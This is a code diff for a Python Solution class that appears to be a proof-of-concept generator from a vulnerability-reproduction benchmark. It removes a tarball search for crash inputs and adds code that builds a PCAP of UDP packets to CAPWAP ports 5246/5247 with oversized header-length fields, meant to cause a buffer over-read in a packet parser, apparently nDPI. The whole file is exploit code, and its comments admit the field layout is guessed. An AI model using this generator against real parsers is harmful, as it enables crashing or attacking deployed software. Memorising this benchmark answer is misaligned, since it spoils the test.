@@ -1,92 +1,167 @@
-import os
-import io
+import struct
 import tarfile
+import os
+from typing import Optional
+
+
+def ip_checksum(h):
+    s = 0
+    n = len(h)
+    i = 0
+    while i + 1 < n:
+        s += (h[i] << 8) + h[i + 1]
+        i += 2
+    if i < n:
+        s += h[i] << 8
+    s = (s & 0xffff) + (s >> 16)
+    s = (s & 0xffff) + (s >> 16)
+    return (~s) & 0xffff
+
+
+def build_ipv4_udp_packet(src_ip, dst_ip, src_port, dst_port, payload):
+    # Ethernet header
+    eth_dst = b'\x00\x11\x22\x33\x44\x55'
+    eth_src = b'\x66\x77\x88\x99\xaa\xbb'
+    eth_type = b'\x08\x00'  # IPv4
+    eth = eth_dst + eth_src + eth_type
+
+    # IP header
+    version_ihl = 0x45
+    dscp_ecn = 0
+    total_length = 20 + 8 + len(payload)
+    identification = 0
+    flags_fragment = 0
+    ttl = 64
+    protocol = 17  # UDP
+    checksum = 0
+    ip_header = struct.pack("!BBHHHBBHII",
+                            version_ihl, dscp_ecn, total_length,
+                            identification, flags_fragment,
+                            ttl, protocol, checksum,
+                            src_ip, dst_ip)
+    csum = ip_checksum(ip_header)
+    ip_header = struct.pack("!BBHHHBBHII",
+                            version_ihl, dscp_ecn, total_length,
+                            identification, flags_fragment,
+                            ttl, protocol, csum,
+                            src_ip, dst_ip)
+
+    # UDP header
+    udp_len = 8 + len(payload)
+    udp_checksum = 0  # set to 0 for simplicity
+    udp_header = struct.pack("!HHHH", src_port, dst_port, udp_len, udp_checksum)
+
+    return eth + ip_header + udp_header + payload
+
+
+def build_pcap(packets):
+    # PCAP global header (little endian)
+    # magic_number, version_major, version_minor, thiszone, sigfigs, snaplen, network
+    gh = struct.pack("<IHHiiii",
+                     0xa1b2c3d4, 2, 4, 0, 0, 65535, 1)
+
+    out = bytearray(gh)
+    ts_sec = 0
+    ts_usec = 0
+    for pkt in packets:
+        incl_len = len(pkt)
+        orig_len = incl_len
+        ph = struct.pack("<IIII", ts_sec, ts_usec, incl_len, orig_len)
+        out += ph
+        out += pkt
+        ts_sec += 1
+    return bytes(out)
+
+
+def build_capwap_overflow_payload() -> bytes:
+    # Attempt to trigger CAPWAP parser with oversized header length.
+    # Set HLEN to a large value using maxed bits in early bytes.
+    # Use UDP destination ports 5246/5247 to select CAPWAP dissector.
+    #
+    # CAPWAP header is 8 bytes minimum; we fill with values that
+    # imply a very large header length to cause overread in vulnerable versions.
+    #
+    # Construct two forms to increase chances:
+    # - First packet: all-ones intro with explicit HLEN nibble of 0x1F (max 31 words)
+    # - Second packet: full 0xFF header to maximize flags and length bits
+    #
+    # Follow header with small payload so that header length exceeds payload.
+    header1 = bytearray(8)
+    # Try to set HLEN to 31 words via common layouts: lower 5 bits of first two bytes.
+    header1[0] = 0xFF  # high bits and lower nibble likely contributes to HLEN
+    header1[1] = 0xFF
+    header1[2] = 0xFF
+    header1[3] = 0xFF
+    header1[4] = 0x00
+    header1[5] = 0x00
+    header1[6] = 0x00
+    header1[7] = 0x00
+    tail1 = b'\x00' * 8  # insufficient data vs declared header length
+
+    # Alternate header crafted to explicitly encode 0x1F in a plausible HLEN field
+    header2 = bytearray(8)
+    # Some implementations place HLEN in low 5 bits across first bytes; encode 0x1F
+    header2[0] = 0x1F  # HLEN = 31 words (124 bytes)
+    header2[1] = 0xFF  # maximize remaining bits/flags
+    header2[2] = 0xAA
+    header2[3] = 0x55
+    header2[4] = 0x00
+    header2[5] = 0x00
+    header2[6] = 0x00
+    header2[7] = 0x00
+    tail2 = b'\x00' * 4  # even shorter extra data
+
+    return bytes(header1 + tail1), bytes(header2 + tail2)
+
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Try to find an existing PoC in the tarball
-        preferred_size = 33
-        candidates = []
-        try:
-            with tarfile.open(src_path, 'r:*') as tf:
-                for ti in tf.getmembers():
-                    if not ti.isfile():
-                        continue
-                    name_lower = ti.name.lower()
-                    # Skip obvious source or text files
-                    if name_lower.endswith(('.c', '.cc', '.cpp', '.h', '.hpp', '.hh', '.py', '.md', '.txt', '.sh', '.cmake', '.json', '.yml', '.yaml', '.xml', '.html', '.rst', '.in', '.am', '.ac', '.m4', '.mk')):
-                        continue
-                    # Heuristic: look for names that might indicate a PoC or seed/crash
-                    interesting = any(k in name_lower for k in [
-                        'poc', 'crash', 'trigger', 'seed', 'corpus', 'capwap', 'min', 'id:', 'repro', 'testcase'
-                    ])
-                    # Consider small binary files as possible PoCs
-                    if interesting or (ti.size > 0 and ti.size <= 4096):
-                        try:
-                            f = tf.extractfile(ti)
-                            if f is None:
-                                continue
-                            data = f.read()
-                        except Exception:
-                            continue
-                        # Filter out text-like files
-                        if b'\x00' not in data and all(32 <= b <= 126 or b in (9, 10, 13) for b in data[: min(len(data), 256)]):
-                            # Likely text; deprioritize
-                            score = 1000
-                        else:
-                            score = 0
-                        # Prefer exact size 33, else close to 33, else small
-                        size_diff = abs(len(data) - preferred_size)
-                        # More preference if filename mentions capwap
-                        name_bonus = -50 if 'capwap' in name_lower else 0
-                        # More preference if typical crash/seed indicators
-                        indicator_bonus = -20 if interesting else 0
-                        total_score = score + size_diff * 2 + len(data) // 64 + name_bonus + indicator_bonus
-                        candidates.append((total_score, len(data), data, ti.name))
-            if candidates:
-                candidates.sort(key=lambda x: (x[0], x[1]))
-                best = candidates[0][2]
-                # If we found something of reasonable size, return it
-                if 1 <= len(best) <= 65536:
-                    return best
-        except Exception:
-            pass
+        # Attempt to detect if the harness appears to be PCAP-based; if we can read the tarball and
+        # find fuzzer references to pcap/ndpiReader, we prefer PCAP. Otherwise, still return PCAP.
+        use_pcap = True
 
-        # Fallback: craft a minimalistic CAPWAP-like payload with an oversized length field to try to trigger overread.
-        # This is a generic guess; exact structure may vary across versions/harnesses.
-        # We produce 33 bytes as per ground-truth length hint.
-        #
-        # Layout (approximate):
-        # [0] Version/Type/Flags (set to plausible non-zero)
-        # [1] Flags
-        # [2..3] Fragment ID
-        # [4..5] Frag Offset/RID
-        # [6..7] WBID/Control flags
-        # [8..11] Padding/Reserved
-        # [12..13] Message Element Type
-        # [14..15] Message Element Length (set intentionally large)
-        # [16..32] Padding/body (insufficient vs declared length to provoke read past end)
-        poc = bytearray(33)
-        # CAPWAP-like header (approximate, not necessarily standard compliant)
-        poc[0] = 0x20  # version/type/flags
-        poc[1] = 0x00  # flags
-        poc[2] = 0x00  # frag id hi
-        poc[3] = 0x01  # frag id lo
-        poc[4] = 0x00  # frag offset hi
-        poc[5] = 0x00  # frag offset lo
-        poc[6] = 0x00  # rsvd/wbid/flags
-        poc[7] = 0x00  # rsvd
-        # padding/reserved
-        poc[8] = 0x00
-        poc[9] = 0x00
-        poc[10] = 0x00
-        poc[11] = 0x00
-        # Message Element header
-        poc[12] = 0x01  # element type hi (arbitrary)
-        poc[13] = 0x01  # element type lo
-        poc[14] = 0xFF  # element length hi (oversized length)
-        poc[15] = 0xF0  # element length lo
-        # Body/padding with some non-zero bytes
-        for i in range(16, 33):
-            poc[i] = (i * 7 + 3) & 0xFF
-        return bytes(poc)
+        try:
+            if os.path.isfile(src_path):
+                with tarfile.open(src_path, "r:*") as tf:
+                    for m in tf.getmembers():
+                        if not m.isfile():
+                            continue
+                        name = m.name.lower()
+                        if not (name.endswith((".c", ".cc", ".cpp", ".h", ".hpp"))):
+                            continue
+                        if "fuzz" in name or "oss-fuzz" in name or "fuzzer" in name or "ndpireader" in name or "pcap" in name:
+                            f = tf.extractfile(m)
+                            if not f:
+                                continue
+                            try:
+                                content = f.read(4096).lower()
+                            except Exception:
+                                continue
+                            # Heuristic indicators for a PCAP-driven harness or ndpiReader
+                            if b"pcap" in content or b"ndpireader" in content or b"dlten10mb" in content or b"libpcap" in content:
+                                use_pcap = True
+                                break
+        except Exception:
+            # On any failure, stick with PCAP
+            use_pcap = True
+
+        # Construct CAPWAP-overflow payloads
+        capwap1, capwap2 = build_capwap_overflow_payload()
+
+        # Build two UDP packets to common CAPWAP ports.
+        src_ip = int.from_bytes(b'\x0a\x00\x00\x01', "big")  # 10.0.0.1
+        dst_ip = int.from_bytes(b'\x0a\x00\x00\x02', "big")  # 10.0.0.2
+
+        pkt1 = build_ipv4_udp_packet(src_ip, dst_ip, 40000, 5246, capwap1)
+        pkt2 = build_ipv4_udp_packet(src_ip, dst_ip, 40001, 5247, capwap2)
+
+        if use_pcap:
+            poc = build_pcap([pkt1, pkt2])
+        else:
+            # Fallback: raw UDP-like framing (very unlikely used; still provide something)
+            # Format: [proto=17][src_port(2)][dst_port(2)] + payload
+            header1 = struct.pack("!BHH", 17, 40000, 5246)
+            header2 = struct.pack("!BHH", 17, 40001, 5247)
+            poc = header1 + capwap1 + header2 + capwap2
+
+        return poc
